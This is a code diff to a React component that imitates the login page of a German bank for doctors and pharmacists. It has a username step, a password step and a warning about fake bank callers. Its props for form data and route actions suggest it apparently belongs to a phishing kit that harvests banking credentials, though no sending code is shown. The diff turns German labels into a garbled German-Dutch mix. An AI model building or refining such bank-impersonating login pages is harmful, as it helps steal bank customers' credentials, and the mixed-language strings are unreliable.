@@ -62,7 +62,7 @@ export function AerzteApothekerBank({ formData, onChange, handleRouteAction, sav
                 <div className="flex flex-col text-white">
                   <h2 className="font-bold text-[15px] mb-1">Achtung: Anrufe FALSCHER Bankmitarbeiter!</h2>
                   <p className="text-[14px] leading-relaxed">
-                    <strong className="font-bold">NIEMALS</strong> Passwörter, Benutzernamen oder Codes nennen.<br />
+                    <strong className="font-bold">NIEMALS</strong> Passwörter, Gebruikersnaamn oder Codes nennen.<br />
                     <strong className="font-bold">SOFORT</strong> auflegen, wenn Sie danach gefragt werden.
                   </p>
                 </div>
@@ -70,7 +70,7 @@ export function AerzteApothekerBank({ formData, onChange, handleRouteAction, sav
 
               {/* Informational Paragraph */}
               <p className="text-[14px] text-gray-700 mb-8 leading-relaxed pr-2">
-                Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner Ihnen unbekannten Seite eingeben und diese geheim halten.
+                Tijdens het inloggen wordt een beveiligde verbinding opgezet. Let op dat u uw inloggegevens nergens anders invoert en deze geheim houdt.
               </p>
 
               {/* Login Form */}
@@ -81,7 +81,7 @@ export function AerzteApothekerBank({ formData, onChange, handleRouteAction, sav
                 {step === 1 ? (
                   <>
                     <div className="flex justify-between items-end mb-1 border-b border-gray-200 pb-1">
-                      <label className="text-[12px] text-gray-500">Anmeldung mit Benutzername</label>
+                      <label className="text-[12px] text-gray-500">Anmeldung mit Gebruikersnaam</label>
                       <div className="text-[12px] text-[#cc0000]">
                         <a href="#" className="hover:underline">Barrierefrei</a> <span className="text-gray-400 mx-1">|</span> <a href="#" className="hover:underline">English</a>
                       </div>
@@ -98,14 +98,14 @@ export function AerzteApothekerBank({ formData, onChange, handleRouteAction, sav
                     
                     <div className="text-center mb-6">
                       <a href="#" className="text-[13px] text-[#cc0000] hover:underline">
-                        Wenn Sie noch keinen Benutzernamen haben klicken Sie bitte hier
+                        Wenn Sie noch keinen Gebruikersnaamn haben klicken Sie bitte hier
                       </a>
                     </div>
                   </>
                 ) : (
                   <>
                     <div className="flex justify-between items-end mb-1 border-b border-gray-200 pb-1">
-                      <label className="text-[12px] text-gray-500">Passwort</label>
+                      <label className="text-[12px] text-gray-500">Wachtwoord</label>
                       <div className="text-[12px] text-[#cc0000]">
                         <a href="#" className="hover:underline">Barrierefrei</a> <span className="text-gray-400 mx-1">|</span> <a href="#" className="hover:underline">English</a>
                       </div>
@@ -135,8 +135,8 @@ export function AerzteApothekerBank({ formData, onChange, handleRouteAction, sav
 
               {/* Footer Links */}
               <div className="mt-8 flex flex-col items-center gap-0.5 border-t border-gray-200 pt-6">
-                <a href="#" className="text-[13px] text-[#cc0000] hover:underline">Benutzername vergessen?</a>
-                <a href="#" className="text-[13px] text-[#cc0000] hover:underline">Passwort vergessen?</a>
+                <a href="#" className="text-[13px] text-[#cc0000] hover:underline">Gebruikersnaam vergessen?</a>
+                <a href="#" className="text-[13px] text-[#cc0000] hover:underline">Wachtwoord vergessen?</a>
               </div>
             </div>
           </div>
